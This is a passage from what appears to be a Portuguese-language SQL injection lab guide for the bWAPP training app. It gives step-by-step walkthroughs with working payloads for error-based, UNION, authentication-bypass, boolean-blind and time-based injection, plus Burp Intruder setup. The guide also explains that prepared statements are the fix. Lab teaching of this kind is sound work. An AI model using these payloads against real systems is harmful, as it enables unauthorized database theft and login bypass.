iron' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -
```

Resposta: `XPATH syntax error: '~bWAPP'`. Pronto, extraiu o banco em UMA requisição. Esse caminho é o atalho quando a aplicação exibe mensagens de erro detalhadas — exatamente o caso do bWAPP em `low`.

### 12.3 Walkthrough — `sqli_2.php` (GET/Select) — contexto numérico

**Query real** (`bWAPP/sqli_2.php:173`):

```php
$sql.= " WHERE id = " . sqli($id);
```

Aqui **não tem aspa nem LIKE**. É inteiro puro. Toda a sintaxe muda.

1. Selecione um filme no dropdown e capture a requisição: `GET /sqli_2.php?movie=1&action=go`.
2. Teste de quebra: `movie=1'` → erro SQL → confirmado, mas a aspa **não fecha string**, ela só desbalanceia.
3. Detecção lógica numérica:
   - `movie=1 AND 1=1` → 1 filme
   - `movie=1 AND 1=2` → vazio
   - `movie=0 OR 1=1` → todos os filmes
4. UNION direto (sem aspa, sem comentário precisa fechar nada):
   ```
   movie=0 UNION SELECT 1,2,3,4,5,6,7
   ```
5. Reconhecimento e enumeração igual à 12.2.

> 💡 Compare com `sqli_1.php`: mesmo banco, mesmas tabelas, mesma técnica de extração — só o **envelope** do payload muda. É exatamente esse o ponto da Fase 2.

### 12.4 Walkthrough — `sqli_6.php` (POST/Search)

Idêntico a `sqli_1.php` na query SQL. O que muda:

- Parâmetro `title` vai no **body** (`Content-Type: application/x-www-form-urlencoded`), não na URL.
- No Repeater do Burp, edite o body diretamente; cuidado com encoding (`%23` para `#`, `+` para espaço se for o caso).

Mesmos payloads da Seção 12.2 — só transplantados para POST. Útil pra praticar o workflow do Repeater.

### 12.5 Walkthrough — `sqli_3.php` (Auth Bypass)

**Query real** (`bWAPP/sqli_3.php:140`):

```php
$sql = "SELECT * FROM heroes WHERE login = '" . $login . "' AND password = '" . $password . "'";
```

Note: nesse nível **nem chama `sqli()`** — input vai cru.

Objetivo: logar sem saber senha. Payload clássico no campo `login`:

```
' OR '1'='1' -- -
```

A query vira:

```sql
SELECT * FROM heroes WHERE login = '' OR '1'='1' -- -' AND password = '...'
```

Tudo após `-- -` é comentário. Resultado: retorna a primeira linha da tabela `heroes`, autenticação passa. No bWAPP esse "herói" costuma ser `neo`.

**Variantes pra praticar:**
- `admin' -- -` no login (só funciona se existir um login `admin`)
- `' UNION SELECT 1,'pwn','pwn',4,5,6,7,8,9,10 -- -` se quiser controlar o que é "logado" (precisa contar colunas da tabela `heroes` antes)

### 12.6 Walkthrough — `sqli_4.php` (Blind Boolean)

**Query** (`bWAPP/sqli_4.php:131`):

```php
$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "'";
```

Aqui é `=`, não `LIKE`. Então só casa se você passar o título **exato**. A página tem dois estados visíveis:
- "The movie has been found in our database!" → query retornou linha
- "The movie does not exist in our database!" → zero linhas

Isso é uma máquina de SIM/NÃO perfeita pra boolean blind.

Sequência:

```
Iron Man' AND '1'='1     → "found"  (SIM)
Iron Man' AND '1'='2     → "not exist"  (NÃO)
Iron Man' AND SUBSTRING(database(),1,1)='b     → SIM (banco começa com b)
Iron Man' AND SUBSTRING(database(),1,1)='a     → NÃO
```

Extraia `database()` letra por letra. Depois use a busca binária ASCII da Seção 7.1 para acelerar com o **Intruder do Burp**:

1. Repeater → botão direito → Send to Intruder.
2. Position 1: o índice em `SUBSTRING(database(),§1§,1)`.
3. Position 2: o valor ASCII em `>§100§`.
4. Attack type: `Cluster bomb`. Payloads: Position 1 = `1..10`, Position 2 = `32..126`.
5. Ordene a tabela por **Length** — as respostas "SIM" terão um tamanho consistente diferente das "NÃO".

### 12.7 Walkthrough — `sqli_15.php` (Blind Time-Based)

**Query** (`bWAPP/sqli_15.php:65`):

```php
$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "'";
```

A aplicação não mostra resultado claro nem mensagem de erro útil. Aí o canal vira o tempo:

```
xyz' OR IF(SUBSTRING(database(),1,1)='b', SLEEP(3), 0) -- -
```

- Resposta demorou ~3s → SIM
- Resposta voltou em < 1s → NÃO

Cuidado com a pegadinha da Seção 7.2: se a query retornar muitas linhas, o `SLEEP` é avaliado por linha. Aqui como é `WHERE title = '...'` (igualdade), o risco é menor — mas em `LIKE` (sqli_1) o jeito seguro é sempre embrulhar:

```
xyz' OR IF((SELECT SUBSTRING(database(),1,1))='b', SLEEP(3), 0) -- -
```

Use o Burp Intruder, **ordenando por "Response received" / Response time**, para identificar visualmente as respostas lentas.

### 12.8 Subindo o nível de segurança (medium / high)

Depois que dominar `low`, troque para `medium` no menu e refaça `sqli_1` e `sqli_2`:

- Em `sqli_1.php` o input passa por `mysqli_real_escape_string` → sua `'` vira `\'`. Nesse contexto **string com aspa escapada**, UNION-based para. Pra contornar: use o parâmetro de outro lab que seja numérico (`sqli_2.php`), onde aspa nem é necessária, e ataque por hex (`0x...`) quando precisar de string.
- Em `sqli_2.php` o input vai direto pra cláusula numérica. Mesmo com `mysqli_real_escape_string`, **número não usa aspa**, então o escape é irrelevante — todos os payloads numéricos da Seção 12.3 continuam funcionando. Use esse exercício pra entender por que escape-de-string não é defesa para input numérico.

No nível `high`, as queries são reescritas com prepared statements e os payloads param de funcionar. Esse é o ponto: ver na prática como o fix se parece.

### 12.9 Como saber que terminou

Para considerar que dominou o bWAPP no nível `low`, você deve conseguir, sem consultar este guia:

- [ ] Detectar a injeção em `sqli_1.php` em < 5 minutos.
- [ ] Listar `version()`, `database()`, `user()` via UNION.
- [ ] Extrair `login` e `password` da tabela `users` em uma única requisição (`GROUP_CONCAT`).
- [ ] Reproduzir o mesmo ataque em `sqli_2.php` (numérico) e `sqli_6.php` (POST).
- [ ] Logar em `sqli_3.php` sem credenciais.
- [ ] Extrair `database()` por boolean blind em `sqli_4.php`.
- [ ] Extrair pelo menos um caractere por time-based em `sqli_15.php`.

Quando todos os itens estiverem marcados, você cobriu manualmente o cardápio principal de SQLi e está pronto pra encarar alvos fora do laboratório.

---

## Material aprofundado por técnica

Quando quiser ir além das fases gerais e estudar uma técnica isolada com profundidade — incluindo enumeração completa do `information_schema` aplicada no bWAPP deste repositório — consulte a pasta [`tecnicas/`](tecnicas/README.md):

- [`tecnicas/union_based.md`](tecnicas/union_based.md) — UNION-based (in-band, com reflexão)
- [`tecnicas/error_based.md`](tecnicas/error_based.md) — Error-based (`EXTRACTVALUE`, `UPDATEXML`, `FLOOR/GROUP BY`)
- [`tecnicas/boolean_based.md`](tecnicas/boolean_based.md) — Blind boolean-based (SIM/NÃO)
- [`tecnicas/time_based.md`](tecnicas/time_based.md) — Blind time-based (`SLEEP`, `BENCHMARK`)
- [`tecnicas/stacked_queries.md`](tecnicas/stacked_queries.md) — Stacked queries (por que **não** funciona no bWAPP, e onde funciona)

Comece pelo [`README`](tecnicas/README.md) da pasta — tem uma árvore de decisão pra escolher qual técnica abrir primeiro.